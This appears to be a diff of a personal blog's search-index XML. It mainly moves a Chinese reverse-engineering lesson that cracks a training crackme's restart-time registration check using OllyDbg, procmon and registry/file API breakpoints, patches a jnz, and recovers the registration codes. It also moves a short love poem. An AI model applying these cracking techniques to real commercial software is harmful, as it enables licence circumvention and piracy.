找RegQueryValueExA，查找输入函数参考，找到比较注册码的算法。</p><p>首先，倒推出真实注册码的长度为12。</p><p>然后，倒推出第5位为的值为0x32(0x66异或0x54)的结果，第9位是0x34，第1位是0x33</p><p>再然后，发现字符串比较，得出第2-4位为MJM，第6-8位为UXJ。</p><p>最后，发现长度不够，随便补了3位。<br>  <img src="https://i.loli.net/2018/07/14/5b49f5ef23867.jpg" alt="image"><img src="https://i.loli.net/2018/07/14/5b49f5fc740ec.jpg" alt="image"><br>  <img src="https://i.loli.net/2018/07/14/5b49f5fc88337.jpg" alt="image"></p><p>4.再打开程序就出现彩蛋提示。<br>  <img src="https://i.loli.net/2018/07/14/5b49f5fc9b127.jpg" alt="image"></p><p>From <a href="https://kabeor.github.io/吾爱破解培训第五课：反击作者的挑衅--实战解除程序重启验证/">https://kabeor.github.io/吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证/</a> bye</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 逆向 </category>
-          
-          <category> 吾爱破解培训 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 逆向 </tag>
-            
-            <tag> 脱壳，重启验证 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>吾爱破解培训第八课：短兵相接--深入浅出探讨脱壳细节（上）</title>
       <link href="/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%9A%E7%9F%AD%E5%85%B5%E7%9B%B8%E6%8E%A5--%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%8E%A2%E8%AE%A8%E8%84%B1%E5%A3%B3%E7%BB%86%E8%8A%82%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
       <url>/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%9A%E7%9F%AD%E5%85%B5%E7%9B%B8%E6%8E%A5--%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%8E%A2%E8%AE%A8%E8%84%B1%E5%A3%B3%E7%BB%86%E8%8A%82%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
@@ -1650,6 +1646,35 @@
             <tag> 逆向 </tag>
             
             <tag> 脱壳 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>吾爱破解培训第五课：反击作者的挑衅--实战解除程序重启验证</title>
+      <link href="/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%8F%8D%E5%87%BB%E4%BD%9C%E8%80%85%E7%9A%84%E6%8C%91%E8%A1%85--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%99%A4%E7%A8%8B%E5%BA%8F%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/"/>
+      <url>/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%8F%8D%E5%87%BB%E4%BD%9C%E8%80%85%E7%9A%84%E6%8C%91%E8%A1%85--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%99%A4%E7%A8%8B%E5%BA%8F%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/</url>
+      
+        <content type="html"><![CDATA[<h1 id="吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证"><a href="#吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证" class="headerlink" title="吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证"></a>吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证</h1><blockquote><p>如何在OD中找到程序调用的一个API的所有位置</p></blockquote><p>OD字符串插件的使用<br>Ctrl+F搜索字符串</p><blockquote><p>熟悉OD如何下断点</p></blockquote><p>Ctrl+G:直接断API</p><p>Ctrl+N:输入表断API      </p><p>ctrl+N显示API窗口，直接搜索API，右键，查找函数参考，可给所有位置下断点</p><p>利用插件apibreak或api断点设置工具</p><blockquote><p>熟悉procmon的使用</p></blockquote><p>可以监控文件，注册表，网络，进线程信息</p><p>排除进程:ExClude</p><p>查看指定进程:Include</p><blockquote><p>熟悉文件操作API的使用</p></blockquote><pre><code>CreateFileA/W:创建文件ReadFile:读取文件WriteFile:写入文件CloseHandle:关闭句柄读取文件:CreateFile-&gt;ReadFile-&gt;CloseHandle写入文件:CreateFile-&gt;WriteFile-&gt;CloseHandle</code></pre><blockquote><p>熟悉注册表操作API的使用</p></blockquote><pre><code>创建注册表Key:RegCreateKey打开注册表Key:RegOpenKey查询注册表键值:RegQueryValue(Ex)写入注册表键值:RegSetValueEx</code></pre><h3 id="什么是重启验证"><a href="#什么是重启验证" class="headerlink" title="什么是重启验证"></a>什么是重启验证</h3><p>重启验证顾名思义就是在程序启动时验证注册信息。 </p><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>基本的执行流程:注册信息输入–&gt;程序重启–&gt;执行验证机制–&gt;正常执行</p><p>扩展的执行流程:注册信息输入–&gt;执行部分验证机制/执行假验证机制–&gt;程序重启–&gt;执行真验证机制–&gt;正常执行</p><p>对于有经验的作者来说,可以在注册信息输入和程序重启之间加入假的验证机制,假的验证机制一般比较简单,比如说只是当单纯的明码比较,当我们输入这个假的注册码的,程序一般会提示注册成功,此时程序就会知道我们是逆向者,在程序重启时就会假装注册成功,在执行程序功能时就会报错或是无反应,这就是所谓的暗桩。</p><h3 id="重启验证的类型"><a href="#重启验证的类型" class="headerlink" title="重启验证的类型"></a>重启验证的类型</h3><p>重启验证根据写入信息位置的不同一般分两类,一类是将注册信息写入文件中,一类是将注册信息写入注册表中。</p><h3 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h3><p>1.字符串定位</p><p>通过OD字符串插件扫描敏感字符串,一般出现的文件路径或是注册表路径都可能是验证信息的保存位置</p><p>2.监控工具定位</p><p>通过procmon等监控工具监控注册信息的写入位置</p><p>3.API定位</p><p>通过定位CreateFile,RegCreateKey等API来获取注册信息的写入位置</p><h3 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h3><blockquote><p>重启验证1:写入信息进txt:             </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JXU2MjExJXU2</span><br></pre></td></tr></table></figure><p>CreateFile-&gt;WriteFile-&gt;ReadFile-&gt;比较算法</p><blockquote><p>重启验证2:写入信息进ini</p></blockquote><p>WritePrivateProfileStringA:写入配置信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0012F530   00544638  |Section = &quot;验证&quot;</span><br><span class="line">0012F534   00544634  |Key = &quot;Key&quot;</span><br><span class="line">0012F538   001C9578  |String = &quot;987654321&quot;</span><br><span class="line">0012F53C   001D7F70  \FileName = &quot;C:\Users\Administrator\Desktop\52Pojie.ini&quot;</span><br></pre></td></tr></table></figure><p>GetPrivateProfileStringA:读取配置信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NjJGJXU3NTI</span><br></pre></td></tr></table></figure><blockquote><p>重启验证3:写入信息进注册表</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4JXU2MjM3</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><img src="https://i.loli.net/2018/07/14/5b49f5eea5ecd.jpg" alt="image"></p><blockquote><p>爆破方法</p></blockquote><p>OD打开，搜索字符串找到<br><img src="https://i.loli.net/2018/07/14/5b49f5eeb9313.jpg" alt="image"></p><p>跟随字符串    </p><pre><code>恭喜你发现彩蛋,这是一个解迷的彩蛋,请根据提示得到正解的注册码</code></pre><p><img src="https://i.loli.net/2018/07/14/5b49f5eecdaef.jpg" alt="image"><br>只要nop掉jnz就可以强制跳转，修改后出现彩蛋<br><img src="https://i.loli.net/2018/07/14/5b49f5eee03fc.jpg" alt="image"></p><blockquote><p>追码方法</p></blockquote><ol><li>52Pojie.txt：ITN3UXJGJ</li></ol><p>Ctrl+N 找ReadFile，查找输入函数参考，找到比较注册码的算法。<br>  <img src="https://i.loli.net/2018/07/14/5b49f5eef2418.jpg" alt="image"></p><ol><li>52Pojie.ini：jN2UXJxEjM2UXJ</li></ol><p>Ctrl+N 找GetPrivateProfileString，查找输入函数参考，找到比较注册码的算法。</p><p>真实注册码（密）：3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A</p><p>加0x30还原为真实注册码（明）：6A 4E 32 55 58 4A 78 45 6A 4D 32 55 58 4A<br>  <img src="https://i.loli.net/2018/07/14/5b49f5ef10e71.jpg" alt="image"></p><ol><li>HKEY_CURRENT_USER\Software\52Pojie：confirm  3MjM2UXJ4abc</li></ol><p>Ctrl+N 找RegQueryValueExA，查找输入函数参考，找到比较注册码的算法。</p><p>首先，倒推出真实注册码的长度为12。</p><p>然后，倒推出第5位为的值为0x32(0x66异或0x54)的结果，第9位是0x34，第1位是0x33</p><p>再然后，发现字符串比较，得出第2-4位为MJM，第6-8位为UXJ。</p><p>最后，发现长度不够，随便补了3位。<br>  <img src="https://i.loli.net/2018/07/14/5b49f5ef23867.jpg" alt="image"><img src="https://i.loli.net/2018/07/14/5b49f5fc740ec.jpg" alt="image"><br>  <img src="https://i.loli.net/2018/07/14/5b49f5fc88337.jpg" alt="image"></p><p>4.再打开程序就出现彩蛋提示。<br>  <img src="https://i.loli.net/2018/07/14/5b49f5fc9b127.jpg" alt="image"></p><p>From <a href="https://kabeor.github.io/吾爱破解培训第五课：反击作者的挑衅--实战解除程序重启验证/">https://kabeor.github.io/吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证/</a> bye</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+          <category> 吾爱破解培训 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向 </tag>
+            
+            <tag> 脱壳，重启验证 </tag>
             
         </tags>
       
@@ -2167,6 +2192,25 @@
     
     
     <entry>
+      <title>Miss You</title>
+      <link href="/Miss%20You/"/>
+      <url>/Miss%20You/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Miss-You"><a href="#Miss-You" class="headerlink" title="Miss You"></a>Miss You</h1><hr><blockquote><p>思念你的眼眸，是从那一刻<br>悄然开始的</p><p>情不知所起，一往而深</p><p>清风湿润，茶烟轻扬<br>汝携芳华，踏入吾梦<br>一花一草，一木一字<br>满天星辰，何不是你</p><p>思念一重一重<br>点缀万家灯火<br>眷恋一天一天<br>跨过寒暑昏昼</p><p>It ‘s sweet of that sugar<br>Cherish every second spend with you<br>Don’t doubt<br>That’s how you make me feel</p><p>Everybody knows I love you bady</p><p>The faster time passes, the more I miss you</p></blockquote><hr><p>为七天前的你写下这段话</p><p>2018/4/22 19:31:16 </p><p>From <a href="https://kabeor.github.io/Miss You/">https://kabeor.github.io/Miss You/</a> bye</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> You </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MATLAB图像处理常用函数</title>
       <link href="/MATLAB%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
       <url>/MATLAB%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
@@ -2184,25 +2228,6 @@
         <tags>
             
             <tag> matlab, 图像处理 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Miss You</title>
-      <link href="/Miss%20You/"/>
-      <url>/Miss%20You/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Miss-You"><a href="#Miss-You" class="headerlink" title="Miss You"></a>Miss You</h1><hr><blockquote><p>思念你的眼眸，是从那一刻<br>悄然开始的</p><p>情不知所起，一往而深</p><p>清风湿润，茶烟轻扬<br>汝携芳华，踏入吾梦<br>一花一草，一木一字<br>满天星辰，何不是你</p><p>思念一重一重<br>点缀万家灯火<br>眷恋一天一天<br>跨过寒暑昏昼</p><p>It ‘s sweet of that sugar<br>Cherish every second spend with you<br>Don’t doubt<br>That’s how you make me feel</p><p>Everybody knows I love you bady</p><p>The faster time passes, the more I miss you</p></blockquote><hr><p>为七天前的你写下这段话</p><p>2018/4/22 19:31:16 </p><p>From <a href="https://kabeor.github.io/Miss You/">https://kabeor.github.io/Miss You/</a> bye</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> You </tag>
             
         </tags>
       
